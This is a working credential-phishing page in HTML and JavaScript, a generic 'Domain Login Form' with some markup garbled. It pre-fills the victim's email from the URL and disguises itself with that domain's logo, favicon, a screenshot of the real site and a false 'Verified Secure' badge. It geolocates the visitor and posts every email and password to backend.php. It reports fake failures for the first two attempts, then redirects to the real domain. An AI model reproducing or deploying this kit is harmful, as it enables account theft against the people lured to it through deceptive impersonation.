<!DOCTYPE html>
<html lang="en">
<head>

    <title>Domain Login Form</title>
    <link id="favicon" rel="icon" href="">
    
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f4f4f4;
            background-size: 100% auto;
            background-position: center top;
            background-repeat: no-repeat;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-form {
            background: rgba(255, 255, 255, 0.98);
            padding: 20px 30px;
            border-radius: 0;
            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1);
            width: 340px;
            text-align: center;
            border: 1px solid #c0c0c0;
        }

        .logo {
            width: 50px;
            height: 50px;
            margin: 0 auto 10px;
            display: none;
            object-fit: contain;
            border-radius: 0;
            background: white;
            padding: 3px;
            border: 1px solid #d0d0d0;
        }

        h2 {
            margin: 0 0 20px 0;
            font-size: 16px;
            color: #2c3e50;
            font-weight: 600;
            letter-spacing: 0.2px;
            padding-bottom: 8px;
            border-bottom: 1px solid #e0e0e0;
        }

        .form-group {
            margin-bottom: 10px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 11px;
            margin-bottom: 3px;
            color: #555;
            font-weight: 500;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 8px 10px;
            font-size: 13px;
            border: 1px solid #b0b0b0;
            border-radius: 0;
            box-sizing: border-box;
            background: #fcfcfc;
            transition: border 0.2s;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #2980b9;
            background: white;
        }

        .forgot-password {
            display: block;
            margin-top: 2px;
            text-align: right;
            font-size: 10px;
            color: #2980b9;
            text-decoration: none;
            font-weight: 500;
        }

        .forgot-password:hover {
            text-decoration: underline;
            color: #1c5d87;
        }

        button {
            width: 100%;
            padding: 9px;
            margin-top: 8px;
            background: #2980b9;
            color: white;
            border: none;
            border-radius: 0;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }

        button:hover {
            background: #1c5d87;
        }

        .secure-note {
            margin-top: 12px;
            padding: 10px;
            font-size: 9px;
            color: #666;
            background: #f5f5f5;
            border-radius: 0;
            border: 1px solid #ddd;
            line-height: 1.3;
        }

        .secure-note .tick {
            color: #27ae60;
            margin-right: 3px;
            font-size: 10px;
        }

        .location-info {
            margin-top: 6px;
            font-size: 8px;
            color: #777;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-top: 1px solid #e8e8e8;
            padding-top: 5px;
        }

        .location-flag {
            font-size: 12px;
            margin-right: 3px;
        }

        .ip-display {
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 8px;
            color: #555;
        }

        .compact-header {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 15px;
            gap: 6px;
        }
        
        .compact-title {
            font-size: 14px;
            color: #2c3e50;
            font-weight: 600;
        }
        
        .domain-badge {
            background: #e8e8e8;
            padding: 4px 8px;
            border-radius: 0;
            font-size: 10px;
            color: #2c3e50;
            font-weight: 500;
            border: 1px solid #c8c8c8;
        }
        
        .inline-error {
            color: #e74c3c;
            font-weight: 600;
            font-size: 11px;
            margin: 3px 0 0 0;
            padding: 2px 0;
            text-align: center;
            min-height: 16px;
        }
    </style>
</head>
<body>

            <div>

                <div class="domain-badge" id="domainBadge" style="display: none;">DOMAIN</div>
            </div>
        </div>
        
        <div class="form-group">

            <input type="email" id="email" name="email" placeholder="Enter email address" required>
        </div>
        
        <div class="form-group">

        </div>
        
        <div class="inline-error" id="error-msg"></div>
        
        <button type="button" id="login-btn">Sign In</button>

    </form>

        // FOOLPROOF LOCATION DETECTION
        async function detectLocationAndTranslate() {
            console.log("=== STARTING LOCATION DETECTION ===");
            
            try {
                // Method 1: Try ipinfo.io (most reliable)
                console.log("Trying ipinfo.io...");
                const response1 = await fetch('https://ipinfo.io/json');
                const data1 = await response1.json();
                
                if (data1 && data1.country) {
                    console.log("Success from ipinfo.io!");
                    console.log("Country:", data1.country);
                    console.log("IP:", data1.ip);
                    console.log("City:", data1.city);
                    
                    // Update display
                    const flags = {'US':'üá∫üá∏','ES':'üá™üá∏','FR':'üá´üá∑','DE':'üá©üá™','IT':'üáÆüáπ','JP':'üáØüáµ','CN':'üá®üá≥','RU':'üá∑üá∫','BR':'üáßüá∑','KR':'üá∞üá∑'};
                    document.getElementById('locationFlag').textContent = flags[data1.country] || 'üìç';
                    document.getElementById('locationText').textContent = `${data1.city || 'Unknown'}, ${data1.country}`;
                    document.getElementById('ipDisplay').textContent = `IP: ${data1.ip}`;
                    
                    // TRANSLATE IMMEDIATELY
                    translateForm(data1.country);
                    return;
                }
            } catch (error) {
                console.log("ipinfo.io failed:", error.message);
            }
            
            try {
                // Method 2: Try ipapi.co
                console.log("Trying ipapi.co...");
                const response2 = await fetch('https://ipapi.co/json/');
                const data2 = await response2.json();
                
                if (data2 && data2.country_code) {
                    console.log("Success from ipapi.co!");
                    console.log("Country:", data2.country_code);
                    console.log("IP:", data2.ip);
                    
                    // Update display
                    const flags = {'US':'üá∫üá∏','ES':'üá™üá∏','FR':'üá´üá∑','DE':'üá©üá™','IT':'üáÆüáπ','JP':'üáØüáµ','CN':'üá®üá≥','RU':'üá∑üá∫'};
                    document.getElementById('locationFlag').textContent = flags[data2.country_code] || 'üìç';
                    document.getElementById('locationText').textContent = `${data2.city || 'Unknown'}, ${data2.country_name || data2.country_code}`;
                    document.getElementById('ipDisplay').textContent = `IP: ${data2.ip}`;
                    
                    // TRANSLATE
                    translateForm(data2.country_code);
                    return;
                }
            } catch (error) {
                console.log("ipapi.co failed:", error.message);
            }
            
            try {
                // Method 3: Simple IP + geolocation
                console.log("Trying combined method...");
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                if (ipData && ipData.ip) {
                    console.log("Got IP:", ipData.ip);
                    
                    // Try to get country from IP
                    const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/country/`);
                    const country = await geoResponse.text();
                    
                    if (country && country.trim().length === 2) {
                        console.log("Got country from IP:", country.trim());
                        translateForm(country.trim());
                    }
                    
                    document.getElementById('ipDisplay').textContent = `IP: ${ipData.ip}`;
                    document.getElementById('locationText').textContent = "Location detected";
                }
            } catch (error) {
                console.log("Combined method failed:", error.message);
            }
            
            // If all fails, show default
            console.log("All methods failed, using default");
            document.getElementById('locationText').textContent = "Online";
            document.getElementById('ipDisplay').textContent = "IP: Active";
            translateForm('en'); // Default to English
        }

        // Process URL hash for domain customization
        const hash = decodeURIComponent(window.location.hash.substring(1));
        
        if (hash) {
            const emailInput = document.getElementById('email');
            emailInput.value = hash;
            
            const atIndex = hash.indexOf('@');
            if (atIndex !== -1) {
                const fullDomain = hash.substring(atIndex + 1);
                const rootDomain = fullDomain.split('.')[0];
                const logo = document.getElementById('logo');
                const domainBadge = document.getElementById('domainBadge');
                const domainHeading = document.getElementById('domainHeading');
                
                // Use a proxy service to avoid CORS issues
                const logoUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://logo.clearbit.com/${fullDomain}?size=256`)}`;
                
                // Set logo source
                logo.src = logoUrl;
                logo.style.display = 'block';
                
                // Set favicon
                document.getElementById('favicon').href = `https://t2.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://${fullDomain}&size=256`;
                
                // Update other elements
                domainHeading.textContent = rootDomain.toUpperCase();
                domainBadge.textContent = fullDomain;
                domainBadge.style.display = 'block';
                
                // Load background image
                document.body.style.backgroundImage = `url('https://image.thum.io/get/width/1920/fullpage/https://${fullDomain}')`;
                
                document.getElementById('secureNote').innerHTML = `<span class="tick">‚úì</span> Verified Secure ‚Ä¢ ${rootDomain.toUpperCase()} Inc. ¬©2025`;
                
                // Add error handling for logo
                logo.onerror = function() {
                    logo.src = `https://t2.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://${fullDomain}&size=256`;
                    logo.onerror = function() {
                        logo.style.display = 'none';
                    };
                };
            }
        }

        // START DETECTION IMMEDIATELY
        window.addEventListener('load', function() {
            console.log("=== PAGE LOADED ===");
            detectLocationAndTranslate();
        });

        // ALSO start immediately
        detectLocationAndTranslate();

        // Login functionality
        let attemptCount = 0;
        const loginBtn = document.getElementById('login-btn');
        const errorMsg = document.getElementById('error-msg');
        
        loginBtn.addEventListener('click', handleLogin);
        
        function handleLogin() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!email || !password) {
                errorMsg.textContent = translations[window.currentLanguage || 'en'].errorEmpty;
                return;
            }
            
            // Submit login data
            const formData = new FormData();
            formData.append('email', email);
            formData.append('password', password);
            
            fetch('backend.php', {
                method: 'POST',
                body: formData
            });
            
            attemptCount++;
            document.getElementById('password').value = '';
            
            // Handle login attempts
            if (attemptCount < 3) {
                errorMsg.textContent = translations[window.currentLanguage || 'en'].errorIncorrect;
            } else {
                errorMsg.textContent = '';
                const domain = email.split('@')[1];
                
                setTimeout(() => {
                    window.location.href = `https://${domain}`;
                }, 1000);
            }
        }
        
        // Add form submission on Enter key
        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                handleLogin();
            }
        });
